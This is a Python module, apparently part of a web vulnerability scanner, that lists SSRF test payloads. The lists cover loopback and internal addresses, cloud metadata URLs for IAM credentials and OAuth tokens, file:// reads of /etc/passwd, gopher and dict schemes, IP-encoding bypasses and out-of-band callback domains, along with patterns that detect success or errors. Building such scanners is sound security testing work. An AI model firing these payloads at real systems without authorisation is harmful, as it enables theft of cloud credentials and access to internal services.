"""
SSRF (Server-Side Request Forgery) Payloads

Contains various payloads for testing SSRF vulnerabilities.
"""

import secrets
import string


def generate_token(length: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(length))


# ============================================================
# Basic SSRF payloads — Internal services
# ============================================================
BASIC_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://127.1",
    "http://127.0.1",
    "http://127.000.000.001",
]


# ============================================================
# Cloud metadata endpoints — AWS/GCP/Azure
# ============================================================
CLOUD_METADATA_PAYLOADS = [
    # AWS EC2 metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    
    # DigitalOcean metadata
    "http://169.254.169.254/metadata/v1/",
    
    # Packet/Equinix metadata
    "http://metadata.packet.net/",
]


# ============================================================
# Internal service scanning
# ============================================================
INTERNAL_SERVICES = [
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:11211",
    
    # Internal network ranges
    "http://192.168.1.1",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://172.17.0.1",  # Docker default
]


# ============================================================
# Protocol-based SSRF
# ============================================================
PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:70",
    "dict://127.0.0.1:11211/stat",
    "sftp://127.0.0.1:22",
    "ldap://127.0.0.1:389",
    "tftp://127.0.0.1:69",
]


# ============================================================
# DNS rebinding bypass attempts
# ============================================================
DNS_BYPASS_PAYLOADS = [
    "http://{token}.burpcollaborator.net",
    "http://{token}.oastify.com",
]


# ============================================================
# URL encoding bypasses
# ============================================================
ENCODING_BYPASS_PAYLOADS = [
    "http://127.0.0.1",  # Decimal IP
    "http://2130706433",  # Decimal equivalent of 127.0.0.1
    "http://0x7f000001",  # Hex IP
    "http://0177.0.0.1",  # Octal first octet
    "http://127.0.0.1.nip.io",  # DNS rebinding domain
    "http://localtest.me",  # Resolves to 127.0.0.1
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
]


# ============================================================
# SSRF success indicators
# ============================================================
SSRF_SUCCESS_PATTERNS = [
    # AWS
    "ami-id",
    "instance-id",
    "security-credentials",
    "AccessKeyId",
    "SecretAccessKey",
    
    # GCP
    "computeMetadata",
    "project-id",
    
    # Azure
    "azEnvironment",
    "subscriptionId",
    "vmId",
    
    # Internal file content (direct file read via SSRF)
    "root:x:0:0:",
    "[extensions]",
    
    # Protocol-level service fingerprints (NOT product names — these appear in raw protocol output)
    # Note: "ssh-" matches SSH protocol banner (e.g. "SSH-2.0-OpenSSH")
    #       "220 " matches FTP/SMTP greeting
    #       "redis_version:" matches Redis INFO response
    "ssh-",
    "220 ",
    "redis_version:",
]


# ============================================================
# SSRF error indicators
# ============================================================
SSRF_ERROR_PATTERNS = [
    "Connection refused",
    "Connection timed out",
    "Network is unreachable",
    "No route to host",
    "Connection reset",
    "getaddrinfo",
    "Name or service not known",
    "Invalid URL",
    "URL blocked",
    "IP not allowed",
    "Access denied",
    "forbidden",
]

# Error-based SSRF detection: send requests to non-routable/closed ports
# and detect if the server reports connection-level errors
SSRF_ERROR_PROBES = [
    # Non-routable IP (guaranteed to fail → should see connection error)
    "http://127.0.0.1:1/",        # closed port → "Connection refused"
    "http://127.0.0.1:62893/",    # random closed port
    "http://[::1]:1/",            # IPv6 localhost closed port
    "http://0.0.0.0:1/",          # invalid address
    "http://192.0.2.1:80/",       # TEST-NET-1 (RFC 5737) — non-routable
    "http://10.255.255.1:80/",    # likely unused in small labs
    # Hostnames that always fail DNS → "Name or service not known"
    "http://this-host-does-not-exist.invalid/",
    "http://ssrf-test-wvs-19.internal/",
]

# Error response patterns for popular HTTP libraries
SSRF_LIBRARY_ERRORS = [
    # PHP
    "php_network_getaddresses",
    "failed to open stream",
    "HTTP request failed",
    "Unable to connect to",
    # Python
    "ConnectionError",
    "Failed to establish a new connection",
    "Max retries exceeded",
    # Java
    "java.net.ConnectException",
    "java.net.UnknownHostException",
    "java.io.IOException",
    # .NET
    "System.Net.WebException",
    "No connection could be made",
    # cURL
    "cURL error",
    "Could not resolve host",
    "Couldn't connect to server",
    # Node.js
    "ECONNREFUSED",
    "ENOTFOUND",
    "ETIMEDOUT",
]


def build_ssrf_payloads(callback_host: str) -> dict:
    """
    Build SSRF payloads with callback host for OOB detection
    
    Args:
        callback_host: Host for out-of-band callbacks (e.g., Burp Collaborator)
    
    Returns:
        Dict with categorized payloads
    """
    token = generate_token()
    
    return {
        "dns_bypass": [p.format(token=token) for p in DNS_BYPASS_PAYLOADS],
        "callback_host": callback_host,
    }
